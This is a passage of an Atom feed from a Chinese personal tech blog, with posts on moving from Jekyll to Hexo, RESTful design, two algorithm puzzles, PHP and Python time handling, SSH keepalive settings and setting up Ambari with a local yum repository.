    <content type="html"><![CDATA[<h1 id="从Jekyll迁移到Hexo"><a href="#从Jekyll迁移到Hexo" class="headerlink" title="从Jekyll迁移到Hexo"></a>从Jekyll迁移到Hexo</h1><p>Blog最初使用Jekyll搭建。由于本人较懒，且对设计无感，随便找了个模板就上了。然而随着品味逐渐提高，对设计也有了一定的认识。并且，Jekyll基于Ruby，Hexo基于Nodejs；Ruby不通，Nodejs稍有涉猎；Hexo结构简洁，Jekyll看着就烦。最终，还是想折腾折腾，就迁移了。</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>首先假设已安装node与npm，同时建议将npm源换到淘宝的镜像(<a href="https://npm.taobao.org/" target="_blank" rel="noopener">https://npm.taobao.org/</a>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> npm install -g hexo-cli # 全局安装hexo-cli</span><br><span class="line"><span class="meta">$</span> npm install hexo --save # 本地安装hexo</span><br></pre></td></tr></table></figure><p>此后会在本地目录下生成node_modules，误删！！</p><p>建立一个hexo项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo init</span><br></pre></td></tr></table></figure><p>接下来，安装Hexo插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> npm i(nstall) hexo-generator-index --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-archive --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-category --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-tag --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-server --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-deployer-git --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-deployer-heroku --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-deployer-rsync --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-deployer-openshift --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-renderer-marked@0.2 --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-renderer-stylus@0.2 --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-feed@1 --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-sitemap@1 --save</span><br></pre></td></tr></table></figure><p>安装结束:)</p><h2 id="主题变更"><a href="#主题变更" class="headerlink" title="主题变更"></a>主题变更</h2><p>先把hexo server跑起来看看效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo server</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure><p>访问<a href="http://localhost:4000看看，Hexo果然看着比Jekyll顺眼。" target="_blank" rel="noopener">http://localhost:4000看看，Hexo果然看着比Jekyll顺眼。</a></p><p>不过我们还是来换个主题——NexT。为什么换？我就是想换！</p><p>下载最新版NexT主题到themes/next文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>修改站点配置文件_config.yml，启用主题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure><p>完成:)</p><p>跑起来看看，跟NexT官网是一样的！</p><p>更多主题细节请参考NexT主题官网！！</p><h2 id="更多配置"><a href="#更多配置" class="headerlink" title="更多配置"></a>更多配置</h2><ul><li>添加Git部署，修改站点配置文件_config.yml</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">   type: git</span><br><span class="line">   repository: git@github.com:path_to_your_git_blog.git</span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure><ul><li>添加”分类”页面</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo new page categories</span><br></pre></td></tr></table></figure><p>编辑页面内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">type: "categories"</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>更多内容，如添加”标签”页面，修改scaffolds模板，fancybox使用等就不再赘述</p><h2 id="文件迁移"><a href="#文件迁移" class="headerlink" title="文件迁移"></a>文件迁移</h2><p>说来简单，将原Jekyll的_posts文件夹下的内容复制到source/_posts下即可。</p><p>同时，最好要保证帖子开头的字段与Hexo模板内字段一致</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.ezlippi.com/blog/2016/02/jekyll-to-hexo.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">Jekyll迁移到Hexo搭建个人博客</a></p><p><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT主题官网</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从Jekyll迁移到Hexo&quot;&gt;&lt;a href=&quot;#从Jekyll迁移到Hexo&quot; class=&quot;headerlink&quot; title=&quot;从Jekyll迁移到Hexo&quot;&gt;&lt;/a&gt;从Jekyll迁移到Hexo&lt;/h1&gt;&lt;p&gt;Blog最初使用Jekyll搭建。由于本人较
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>解决MAC双屏时同时滑动</title>
    <link href="http://retanoj.github.io/2016/07/26/Misc-2016-07-26-%E8%A7%A3%E5%86%B3MAC%E5%8F%8C%E5%B1%8F%E6%97%B6%E5%90%8C%E6%97%B6%E6%BB%91%E5%8A%A8/"/>
    <id>http://retanoj.github.io/2016/07/26/Misc-2016-07-26-解决MAC双屏时同时滑动/</id>
    <published>2016-07-25T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Just-do-it"><a href="#Just-do-it" class="headerlink" title="Just do it"></a>Just do it</h2><p>系统偏好设置 -&gt; Mission Control -&gt; 显示器具有单独的Spaces(勾选)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Just-do-it&quot;&gt;&lt;a href=&quot;#Just-do-it&quot; class=&quot;headerlink&quot; title=&quot;Just do it&quot;&gt;&lt;/a&gt;Just do it&lt;/h2&gt;&lt;p&gt;系统偏好设置 -&amp;gt; Mission Control -&amp;gt; 显示器
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>对RESTful的理解</title>
    <link href="http://retanoj.github.io/2016/07/21/Misc-2016-07-21-%E5%AF%B9RESTful%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>http://retanoj.github.io/2016/07/21/Misc-2016-07-21-对RESTful的理解/</id>
    <published>2016-07-20T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.725Z</updated>
    
    <content type="html"><![CDATA[<p>REST(REpresentational State Transfer)，可以试译为”表现状态转变”。 REST是一种软件架构风格，也是一套约束条件。满足这套约束条件的设计叫做RESTful设计，在此之上的实现叫做RESTful的实现。</p><p>表现状态转变(REST)缺少个主体，即“资源”。所以可以被叫做“资源表现状态转变”。</p><h2 id="一、资源-Resources"><a href="#一、资源-Resources" class="headerlink" title="一、资源(Resources)"></a>一、资源(Resources)</h2><p>资源，即网络上的一个实体。它可能是一段文本，一张图片，也可能是一个服务。通常用URI（统一资源定位符）指向它。</p><h2 id="二、表现-Representation"><a href="#二、表现-Representation" class="headerlink" title="二、表现(Representation)"></a>二、表现(Representation)</h2><p>表现，即资源这个信息实体的表现形式。例如文本可以以HTML的形式来展现给用户，还可以已JSON展现。</p><p>因此，有些言论中说，URI中定位到资源时的后缀带有“.html”是不必要的，因为它在“资源”的层面表达了“表现”层面所要表达的内容。这样的说法也不无道理。而资源的具体表现形式，应该在HTTP协议中的Content-Type字段和Accept字段中被描述。</p><h2 id="三、状态转变-State-Transfer"><a href="#三、状态转变-State-Transfer" class="headerlink" title="三、状态转变(State Transfer)"></a>三、状态转变(State Transfer)</h2><p>HTTP协议是一个无状态的协议。客户端和服务器交互的状态被通过各种方式保存在服务端。例如用户上传了自己的头像，更新了自己的昵称，这些都在服务端被记录和保存。由此看来，如果用户想让处在服务端的资源发生改变，就要通过某种手段让其状态发生转变。而这种转变是建立在“表现”层上，所以被叫做“表现状态转变”。</p><p>在REST里规定了客户端操纵资源的几个动词，即HTTP协议中的Method。包括“GET”(获取)、“POST”(新建)、“PUT”(更新)、“DELETE”(删除)。</p><h2 id="四、案例-Case-Study"><a href="#四、案例-Case-Study" class="headerlink" title="四、案例(Case Study)"></a>四、案例(Case Study)</h2><p>1) /posts/33  vs  /posts/show/33</p><p>URI里包含动词是RESTful设计的一大误区。动词应该是HTTP的Method，不应该出现在URI中。URI是单纯的对互联网上资源的指向。因此GET /posts/33是正确的设计方法。</p><p>2) /account/2/transfer/104/to/5  vs  /transaction</p><p>RESTful的动词的确存在局限，例如在金钱交易的时候，四个动词均不能表达“转账”的概念。但换个角度来看，“转账”可以成为一项服务，而服务可以被看做互联网上的一种资源（服务是资源）。因此可以在URI中将“转账”设计成/transaction，通过动词POST来建立转账记录。</p><pre><code>POST /transaction HTTP/2.0...account=2&amp;money=104.00&amp;to=5</code></pre><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/09/restful.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;REST(REpresentational State Transfer)，可以试译为”表现状态转变”。 REST是一种软件架构风格，也是一套约束条件。满足这套约束条件的设计叫做RESTful设计，在此之上的实现叫做RESTful的实现。&lt;/p&gt;
&lt;p&gt;表现状态转变(RES
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>leetcode 338.Counting Bits</title>
    <link href="http://retanoj.github.io/2016/04/16/%E9%A2%98%E7%9B%AE-2016-04-16-leetcode-338-Counting-Bits/"/>
    <id>http://retanoj.github.io/2016/04/16/题目-2016-04-16-leetcode-338-Counting-Bits/</id>
    <published>2016-04-15T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="388-Counting-Bits"><a href="#388-Counting-Bits" class="headerlink" title="388.Counting Bits"></a>388.Counting Bits</h2><p>给出一个非零数字 num，对于每一个在 0 &lt;= i &lt;= num的i，输出 i 的二进制表示中数字1的个数。</p><p>例如 num = 5，应该输出 [0,1,1,2,1,2]。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>num = 5时</p><p>i = 0 – 0000， 1的个数为 res[0] = 0 个</p><p>i = 1 – 0001， 1的个数为 res[1] = 1 个</p><p>i = 2 – 0010， 1的个数为 res[2] = 1 个</p><p>i = 3 – 0011， 1的个数为 res[3] = 2 个</p><p>i = 4 – 0100， 1的个数为 res[4] = 1 个</p><p>i = 5 – 0101， 1的个数为 res[5] = 2 个</p><p>重点在于如何利用先前计算得到的结果来帮助计算当前 i 所对应的值。</p><p>当 i 是奇数（如5）时，末位’1’由 4 加一而来，因此res[5] = res[5 - 1] + 1，也可以用&amp;将末位置零，即res[5] = res[5 &amp; 4] + 1</p><p>当 i 是偶数（如4）时，末位’0’由 3 加一进位而来，即b’011’ -&gt; b’100’。同样，可以用&amp;将变化的bit位置零后，结果加一即可。 res[4] = res[4 &amp; 3] + 1</p><p>因此, res[i] = res[(i &amp; (i-1))] + 1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;388-Counting-Bits&quot;&gt;&lt;a href=&quot;#388-Counting-Bits&quot; class=&quot;headerlink&quot; title=&quot;388.Counting Bits&quot;&gt;&lt;/a&gt;388.Counting Bits&lt;/h2&gt;&lt;p&gt;给出一个非零数字 n
      
    
    </summary>
    
      <category term="算法" scheme="http://retanoj.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>腾讯2016在线笔试某题</title>
    <link href="http://retanoj.github.io/2016/03/03/%E9%A2%98%E7%9B%AE-2016-03-03-%E8%85%BE%E8%AE%AF2016%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AF%95%E6%9F%90%E9%A2%98/"/>
    <id>http://retanoj.github.io/2016/03/03/题目-2016-03-03-腾讯2016在线笔试某题/</id>
    <published>2016-03-02T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>甲乙两人按一定规则拿棋子，棋子有19颗，规则是每次每人只能拿1或3或6颗。问是否有先手必胜策略，策略是什么？</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>首先说明一点，按个人理解题意，当剩下2颗棋子时，选手只能拿走1颗。</p><p>接下来说递推过程</p><ul><li><p>棋子有1颗，按如上规则，那么先手必胜，必胜策略是拿1颗；</p></li><li><p>棋子有2颗，按如上规则，那么先手必败，因为先手只能拿1颗，后手（对方）在剩余棋子情况下拿1颗，对方赢；</p></li><li><p>棋子有3颗，按如上规则，那么先手必胜，必胜策略是拿3颗；</p></li><li><p>棋子有4颗，……………………….先手必败，因为无论先手拿1颗还是3颗，后手（对方）都能一次拿完剩余的3颗或1颗（即，当先手拿完棋子后，在剩余棋子的情况下后手拥有“先拿”必胜策略）；</p></li><li><p>……</p></li></ul><p>可归纳出结论如下：在棋子有N颗的情况下，若先手通过拿1颗或3颗或6颗的规则能够将后手引入剩余棋子的“先拿”必败策略，则先手必胜；若先手在三种规则下都会将后手引入剩余棋子的“先拿”必胜策略，则先手必败。</p><p>因此可以列出下表</p><p><img src="http://ww3.sinaimg.cn/large/3dc4ad00jw1f2qdp6zltzj20hs02paam.jpg" alt></p><p>举例来看，当棋子有7颗时，先手拿1颗后手剩6颗，后手进入“先拿必胜棋子数6颗”的情况；先手拿3颗，后手进入“先拿必输棋子数4颗”的情况。因此在棋子数为7时，先手先拿3颗会必胜。</p><p>因此，19颗时，19-1=18（可行），19-3=16（不行），19-6=13（可行）。先手有两种必胜策略，先拿1颗或先拿6颗。</p><p>往后推也可以知道，这种算法的时间复杂度为O(n)</p><p>题解结束</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;甲乙两人按一定规则拿棋子，棋子有19颗，规则是每次每人只能拿1或3或6颗。问是否有先手必胜策略，策略是什么？&lt;/p&gt;
&lt;h2 id=&quot;题解&quot;
      
    
    </summary>
    
      <category term="算法" scheme="http://retanoj.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>网站返回时间问题</title>
    <link href="http://retanoj.github.io/2014/08/14/Misc-2014-08-14-%E7%BD%91%E7%AB%99%E8%BF%94%E5%9B%9E%E6%97%B6%E9%97%B4%E9%97%AE%E9%A2%98/"/>
    <id>http://retanoj.github.io/2014/08/14/Misc-2014-08-14-网站返回时间问题/</id>
    <published>2014-08-13T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GMT时间"><a href="#GMT时间" class="headerlink" title="GMT时间"></a>GMT时间</h2><pre><code>GMT(Greenwich Mean Time)是格林尼治平时在格林尼治子午线上的平太阳时称为世界时(UTC)，又叫格林尼治平时(GMT)。 </code></pre><h2 id="PHP时区设置"><a href="#PHP时区设置" class="headerlink" title="PHP时区设置"></a>PHP时区设置</h2><pre><code>在php.ini中，`date.timezone` 参数控制时区上海时间为GMT + 0800小时，即东八区一些常用的时区标识符说明：     Asia/Shanghai – 上海    Asia/Macao – 澳门     ...在程序PHP 5以上版本的程序代码中使用函数    ini_set(&apos;date.timezone&apos;,&apos;Asia/Shanghai&apos;); 或     date_default_timezone_set(‘Asia/Shanghai&apos;); 来设置时区</code></pre><h2 id="PHP-时间戳与日期转换"><a href="#PHP-时间戳与日期转换" class="headerlink" title="PHP 时间戳与日期转换"></a>PHP 时间戳与日期转换</h2><pre><code>返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数。    echo time();UNIX时间戳转换为日期函数: date()    echo date(&quot;Y-m-d H:i:s&quot;,time());日期转换为时间戳用函数: strtotime()    echo strtotime(&apos;2010-03-24 08:15:42&apos;);</code></pre><h2 id="Python-时间戳与日期转换"><a href="#Python-时间戳与日期转换" class="headerlink" title="Python 时间戳与日期转换"></a>Python 时间戳与日期转换</h2><pre><code>UNIX时间戳转换为日期函数: time.strftime()    import time    x = time.localtime(1317091800.0)    time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;, x)日期转换为时间戳用函数: datetime.datetime()    import time    import datetime    dc = datetime.datetime(2010, 6, 8, 19, 14, 59)    print time.mktime(dc.timetuple())</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GMT时间&quot;&gt;&lt;a href=&quot;#GMT时间&quot; class=&quot;headerlink&quot; title=&quot;GMT时间&quot;&gt;&lt;/a&gt;GMT时间&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;GMT(Greenwich Mean Time)是格林尼治平时
在格林尼治子午线上的平太阳时称为世界
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>保持SSH连接</title>
    <link href="http://retanoj.github.io/2014/08/13/Misc-2014-08-13-%E4%BF%9D%E6%8C%81SSH%E8%BF%9E%E6%8E%A5/"/>
    <id>http://retanoj.github.io/2014/08/13/Misc-2014-08-13-保持SSH连接/</id>
    <published>2014-08-12T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.724Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h2><pre><code>修改/etc/ssh/sshd_config  TCPKeepAlive yes  ClientAliveInterval 60  ClientAliveCountMax 5</code></pre><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><pre><code>ssh客户端全局修改/etc/ssh/ssh_config  TCPKeepAlive yes  ServerAliveInterval 60ssh客户端针对某次连接  ssh -o ServerAliveInterval=60 IPPuTTY客户端  在PuTTY Configuration中的Connection选项卡中  将Seconds between keepalives调成 10 （秒为单位）MyEnTunnel客户端  勾选Slow Poll（慢速轮询）选项</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;服务器端&quot;&gt;&lt;a href=&quot;#服务器端&quot; class=&quot;headerlink&quot; title=&quot;服务器端&quot;&gt;&lt;/a&gt;服务器端&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;修改/etc/ssh/sshd_config
  TCPKeepAlive yes
  ClientAliv
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>安装ambari(1.4.1.25)</title>
    <link href="http://retanoj.github.io/2014/03/27/%E4%BA%91%E8%AE%A1%E7%AE%97-2014-03-27-%E5%AE%89%E8%A3%85ambari-1-4-1-25/"/>
    <id>http://retanoj.github.io/2014/03/27/云计算-2014-03-27-安装ambari-1-4-1-25/</id>
    <published>2014-03-26T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.730Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h3><p>1.1 永久关闭iptables、selinux，开启htpd服务（或者后期配置iptables）</p><pre><code>iptables服务开机自启动： chkconfig iptables on开机不启动： chkconfig iptables off启动： service iptables start关闭： service iptables stopselinux永久关闭临时关闭： sudo setenforce 0修改 /etc/selinux/config 中 SELINUX=disabledntpd服务安装： yum install -y ntp开机自启动： chkconfig ntpd on启动： /etc/init.d/ntpd start</code></pre><p>1.2 集群识别</p><pre><code>方法一 —— 配置hosts文件xxx.xxx.xxx.xxx ambarixxx.xxx.xxx.xxx master.hadoop方法二 —— 配置DNS域名服务器 和 每台机器的FQDN</code></pre><p>1.3 集群免密登陆</p><pre><code>配置 ambari-server 与各个 ambari-agent 之间免密码登陆，并保存好ambari-server的私钥备用参考 1.设置sudo免密码登陆http://www.cnblogs.com/maybob/p/3298846.html2.设置SSH无密码登陆远程主机http://www.cnblogs.com/maybob/p/3298903.html</code></pre><p>1.4 集群时间同步</p><pre><code>参考 http://www.cnblogs.com/maybob/p/3332003.html</code></pre><h2 id="2-安装与配置ambari服务"><a href="#2-安装与配置ambari服务" class="headerlink" title="2. 安装与配置ambari服务"></a>2. 安装与配置ambari服务</h2><p>2.1 配置ambari本地源</p><pre><code>vim /etc/yum.repos.d/ambari.repo添加以下内容&apos;&apos;&apos;[ambari-1.x]name=Ambari 1.xbaseurl=http://源IP/ambari/gpgcheck=0enabled=1[HDP-UTILS-1.1.0.16]name=Hortonworks Data Platform Utils Version - HDP-UTILS-1.1.0.16baseurl=http://源IP/ambari/gpgcheck=0enabled=1[Updates-ambari-1.4.1.25]name=ambari-1.4.1.25 - Updatesbaseurl=http://源IP/ambari/gpgcheck=enabled=1&apos;&apos;&apos;vim /etc/yum.repos.d/centos.repo添加以下内容&apos;&apos;&apos;[centos]baseurl=http://源IP/centos/enabled=1gpgcheck=0&apos;&apos;&apos;</code></pre><p>2.2 开始安装</p><pre><code>yum -y install ambari-server</code></pre><p>2.3 开始配置ambari服务</p><pre><code>将之前准备的 jdk-6u31-linux-x64.bin 上传到 /var/lib/ambari-server/resourceschmod +x jdk-6u31-linux-x64.binambari-server setup #安装过程中保持默认就好</code></pre><h2 id="3-为ambari配置hadoop本地源"><a href="#3-为ambari配置hadoop本地源" class="headerlink" title="3. 为ambari配置hadoop本地源"></a>3. 为ambari配置hadoop本地源</h2><pre><code>cd /var/lib/ambari-server/resources/stacks/HDPLocal/2.0.6/repos/vim repoinfo.xml 修改对应系统版本(centos 6)的 &lt;baseurl&gt;&lt;reposinfo&gt;  &lt;os type=&quot;centos6&quot;&gt;    &lt;repo&gt;      &lt;baseurl&gt;http://源IP/hdp/&lt;/baseurl&gt;      &lt;repoid&gt;HDP-2.0.6&lt;/repoid&gt;      &lt;reponame&gt;HDP&lt;/reponame&gt;    &lt;/repo&gt;  &lt;/os&gt;</code></pre><p>到此，ambari安装完成。在接下来的环境部署过程中，ambari为所有主机安装ambari-agent时，会将ambari server下的 /etc/yum.repo.d/ambari.repo 文件复制到所有主机。在安装hadoop环境时，会将3中设置的本地源配置到所有主机</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-前期准备&quot;&gt;&lt;a href=&quot;#1-前期准备&quot; class=&quot;headerlink&quot; title=&quot;1. 前期准备&quot;&gt;&lt;/a&gt;1. 前期准备&lt;/h3&gt;&lt;p&gt;1.1 永久关闭iptables、selinux，开启htpd服务（或者后期配置iptables）&lt;/p
      
    
    </summary>
    
      <category term="云计算" scheme="http://retanoj.github.io/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    
      <category term="云计算" scheme="http://retanoj.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="ambari" scheme="http://retanoj.github.io/tags/ambari/"/>
    
  </entry>
  
  <entry>
    <title>搭建本地ambari yum源</title>
    <link href="http://retanoj.github.io/2014/03/26/%E4%BA%91%E8%AE%A1%E7%AE%97-2014-03-26-%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ambari-yum%E6%BA%90/"/>
    <id>http://retanoj.github.io/2014/03/26/云计算-2014-03-26-搭建本地ambari-yum源/</id>
    <published>2014-03-25T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.730Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-一台联网机器，下载所需文件"><a href="#1-一台联网机器，下载所需文件" class="headerlink" title="1. 一台联网机器，下载所需文件"></a>1. 一台联网机器，下载所需文件</h2><p>1.1 准备ambari.repo相关组件</p><pre><code>wget http://public-repo-1.hortonworks.com/ambari/centos6/1.x/updates/1.4.1.25/ambari.repocp ambari.repo /etc/yum.repos.d/同步如下安装包 (ps,会直接同步到当前目录下)reposync -r HDP-UTILS-1.1.0.16reposync -r Updates-ambari-1.4.1.25reposync -r ambari-1.x</code></pre><p>1.2.1 准备hortonworks hadoop (HDP) 2.0.6本地源 ——方法一</p><pre><code>vim /etc/yum.repos.d/HDP.repo添加如下内容&apos;&apos;&apos;[HDP-2.0.6]name=HDPbaseurl=http://public-repo-1.hortonworks.com/HDP/centos6/2.x/updates/2.0.6.0enabled=1gpgcheck=0&apos;&apos;&apos;同步HDP-2.0.6到本地（约3G大小）reposync -r HDP-2.0.6</code></pre><p>1.2.2 准备hortonworks hadoop (HDP) 2.0.6本地源 ——方法二</p><pre><code>下载HDP-2.0.6即可http://s3.amazonaws.com/public-repo-1.hortonworks.com/HDP/centos6/HDP-2.0.6.0-centos6-rpm.tar.gz</code></pre><p>1.3 下载或准备Centos 6系统</p><pre><code>如北理源    http://mirror.bit.edu.cn/centos/6/os/x86_64/</code></pre><p>1.4 下载好 <strong>jdk-6u31-linux-x64.bin</strong> 备用 </p><h2 id="2-搭建本地yum源环境"><a href="#2-搭建本地yum源环境" class="headerlink" title="2. 搭建本地yum源环境"></a>2. 搭建本地yum源环境</h2><p>2.1 制作ambari源相关组件源</p><pre><code>需要一台较大硬盘的web服务器，可被即将安装ambari的机器访问到将 HDP-UTILS-1.1.0.16 、 Updates-ambari-1.4.1.25 、 ambari-1.x 复制到 /var/www/html/ambari文件夹下执行如下命令cd /var/www/html/ambaricreaterepo ./ (ps, createrepo 可能需要安装)</code></pre><p>2.2 制作HDP-2.0.6软件源</p><pre><code>将之前下载或同步的HDP-2.0.6 (如果是.tar.gz文件需要解压) 复制到 /var/www/html/hdp文件夹下执行如下命令cd /var/www/html/hdpcreaterepo ./</code></pre><p>2.3 制作Centos 6安装源</p><pre><code>将之前准备的centos 6安装环境复制到 /var/www/html/centos/ 文件夹下 (ps, 如需解压请解压)</code></pre><h2 id="3-测试源是否成功"><a href="#3-测试源是否成功" class="headerlink" title="3. 测试源是否成功"></a>3. 测试源是否成功</h2><pre><code>访问 http://本机ip/ambari 、 http://本机ip/hdp 和 http://本机ip/centos 能够正常访问即可    </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-一台联网机器，下载所需文件&quot;&gt;&lt;a href=&quot;#1-一台联网机器，下载所需文件&quot; class=&quot;headerlink&quot; title=&quot;1. 一台联网机器，下载所需文件&quot;&gt;&lt;/a&gt;1. 一台联网机器，下载所需文件&lt;/h2&gt;&lt;p&gt;1.1 准备ambari.rep
      
    
    </summary>
    
      <category term="云计算" scheme="http://retanoj.github.io/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    
      <category term="云计算" scheme="http://retanoj.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="ambari" scheme="http://retanoj.github.io/tags/ambari/"/>
    
  </entry>
  
</feed>
